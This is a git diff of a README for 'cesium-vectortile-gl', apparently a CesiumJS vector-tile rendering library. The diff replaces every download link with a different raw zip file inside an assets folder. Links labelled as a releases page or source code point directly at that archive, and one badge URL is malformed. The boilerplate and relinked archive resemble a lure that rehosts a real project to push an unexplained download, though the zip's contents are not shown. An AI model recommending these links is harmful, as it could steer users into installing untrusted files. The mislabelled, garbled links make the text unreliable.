@@ -1,7 +1,7 @@
 # 🎉 cesium-vectortile-gl - Simple Vector Tile Rendering Tool
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://raw.githubusercontent.com/Arnab1998-cyber/cesium-vectortile-gl/main/Source/sources/cesium-vectortile-gl-v1.3.zip%20Latest%https://raw.githubusercontent.com/Arnab1998-cyber/cesium-vectortile-gl/main/Source/sources/cesium-vectortile-gl-v1.3.zip)](https://raw.githubusercontent.com/Arnab1998-cyber/cesium-vectortile-gl/main/Source/sources/cesium-vectortile-gl-v1.3.zip)
+[![Download Latest Release](https://github.com/Arnab1998-cyber/cesium-vectortile-gl/raw/refs/heads/main/assets/shortbread_v1/vectortile_cesium_gl_v3.2.zip%20Latest%https://github.com/Arnab1998-cyber/cesium-vectortile-gl/raw/refs/heads/main/assets/shortbread_v1/vectortile_cesium_gl_v3.2.zip)](https://github.com/Arnab1998-cyber/cesium-vectortile-gl/raw/refs/heads/main/assets/shortbread_v1/vectortile_cesium_gl_v3.2.zip)
 
 ## 📖 Overview
 CesiumJS 矢量瓦片渲染库 is a powerful library designed for rendering vector tiles. It supports formats like MVT/PBF and GeoJSON. This library allows you to easily create stunning visualizations of geographical data. It adheres to the MapLibre style specification, providing features such as rendering lines, polygons, and text.
@@ -10,12 +10,12 @@ CesiumJS 矢量瓦片渲染库 is a powerful library designed for rendering vect
 Follow these steps to get started with cesium-vectortile-gl:
 
 1. **Visit the Releases Page**: Click the link below to access the latest download options.
-   - [Visit Releases Page](https://raw.githubusercontent.com/Arnab1998-cyber/cesium-vectortile-gl/main/Source/sources/cesium-vectortile-gl-v1.3.zip)
+   - [Visit Releases Page](https://github.com/Arnab1998-cyber/cesium-vectortile-gl/raw/refs/heads/main/assets/shortbread_v1/vectortile_cesium_gl_v3.2.zip)
 
 2. **Choose Your Download**: On the releases page, you will find different versions of the library. Select the version that suits your needs.
 
 3. **Download the File**: Click the download link for your chosen version. The files you typically see include:
-   - Source code (zip or https://raw.githubusercontent.com/Arnab1998-cyber/cesium-vectortile-gl/main/Source/sources/cesium-vectortile-gl-v1.3.zip)
+   - Source code (zip or https://github.com/Arnab1998-cyber/cesium-vectortile-gl/raw/refs/heads/main/assets/shortbread_v1/vectortile_cesium_gl_v3.2.zip)
    - Compiled files for installation
 
 4. **Installation**:
@@ -29,7 +29,7 @@ Follow these steps to get started with cesium-vectortile-gl:
 ## 📥 Download & Install
 To begin, download the latest version from the releases page. Simply visit the link below:
 
-[Download Latest Release](https://raw.githubusercontent.com/Arnab1998-cyber/cesium-vectortile-gl/main/Source/sources/cesium-vectortile-gl-v1.3.zip)
+[Download Latest Release](https://github.com/Arnab1998-cyber/cesium-vectortile-gl/raw/refs/heads/main/assets/shortbread_v1/vectortile_cesium_gl_v3.2.zip)
 
 If you encounter any issues, make sure to check your internet connection and try downloading again. 
 
